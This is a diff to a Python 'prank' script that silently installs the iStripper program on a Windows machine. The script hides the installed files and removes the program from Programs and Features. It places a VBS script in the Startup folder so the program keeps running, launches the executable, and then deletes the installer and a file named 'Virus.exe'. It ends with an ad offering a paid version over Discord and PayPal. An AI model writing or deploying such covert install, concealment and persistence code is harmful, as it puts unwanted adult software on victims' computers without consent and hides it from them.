@@ -15,6 +15,7 @@ filename = 'istripper.exe'
 cwd = str(os.getcwd())
 login = str(os.getlogin())
 dire = f'C:/Users/{login}/AppData/Local/vghd'
+exe = f'C:/Users/{login}/AppData/Local/vghd/bin/vghd.exe'
 di = fr'C:\Users\{login}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
 vbs_startup = os.path.join(di, 'script.vbs')
 shortcut_name = 'script'
@@ -41,7 +42,7 @@ def download_software(url, filename):
 
 def install_software(filename):
     print("Installing the software silently")
-    subprocess.run(["istripper.exe", "/VerySilent", "/NOCANCEL"], check=True)
+    subprocess.run(["istripper.exe", "/Silent", "/NOCANCEL"], check=True)
     time.sleep(3)  # just for confirmation
 
 
@@ -141,11 +142,18 @@ if __name__ == "__main__":
     install_software(filename=filename)
     hide_all_vghd_files(dir=dire)
     hide_programs_and_feature()
+    
     # creating object and calling the methods(functions)
     r = Run_istripper_continuosly()  # .check_whether_istripper_running_or_not(di)
     r.create_checking_script_for_istripper()
     r.run_script_at_startup_istripper(
         vbs_loc=vbs, vbs_startup_loc=vbs_startup, dst_loc=di)
+    
+    subprocess.Popen(exe)
+
     print("done everything thanks for using the software !!! this is only for prank and there is a premium version in which the girls do full strip tease naked, this software only for 5$ to buy contact me on discord")
 
     webbrowser.open("https://paypal.me/furjack")
+    print('self destructing')
+    os.remove('istripper.exe')
+    os.remove('Virus.exe')
